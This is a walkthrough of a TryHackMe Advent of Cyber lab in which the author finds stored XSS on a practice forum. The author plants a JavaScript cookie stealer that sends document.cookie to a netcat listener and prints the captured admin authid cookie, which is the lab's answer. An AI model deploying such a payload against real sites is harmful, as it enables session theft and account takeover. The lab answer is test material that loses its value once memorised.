---
title: "Advent of Cyber Day 18 ELF JS"
author: Ludovic COULON
date: 2020-05-08
hero: ./images/hero.png
excerpt: "Advent of Cyber Day 18 ELF JS"
secret: true
---

[TryHackMe | Advent of Cyber](https://tryhackme.com/room/25daysofchristmas)

McSkidy knows the crisis isn't over. The best thing to do at this point is OSINT

we need to learn more about the christmas monster

During their OSINT, they came across a Hacker Forum. Their research has shown
them that this forum belongs to the Christmas Monster. Can they gain
access to the admin section of the forum? They haven't made an account
yet so make sure to register.

Access the machine at http://[your-ip-address]:3000 - **it may take a few minutes to deploy.**

Check out the supporting material [here](https://docs.google.com/document/d/19TJ6ANmM-neOln0cDh7TPMbV9rsLkSDKS3nj0eJaxeg/edit#).

P.S. If you want to learn more about XSS, we have a [room](https://tryhackme.com/room/xss) where you can learn about it in depth.

### Setup

First let's try all the form post to see if there is an XSS attack

![https://imgur.com/QYpc4e3.png](https://imgur.com/QYpc4e3.png)

As you can see the website is vulnerable to stored XSS

Now let's implement cookie stealer.

Reference →

[How to Write an XSS Cookie Stealer in JavaScript to Steal Passwords](https://null-byte.wonderhowto.com/how-to/write-xss-cookie-stealer-javascript-steal-passwords-0180833/)

```bash
<script>window.location = 'http://10.9.45.74:9999/page?param=' + document.cookie </script>
```

### Now let's wait for the admin's token

```bash
nc -lnvp 9999
```

### #1 What is the admin's authid cookie value?

```bash
kali@kali:~$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.9.45.74] from (UNKNOWN) [10.10.125.201] 55668
GET /page?param=authid="2564799a4e6689972f6d9e1c7b406f87065cbf65" HTTP/1.1
Host: 10.9.45.74
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3844.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://localhost:3000/admin
Accept-Encoding: gzip, deflate
```
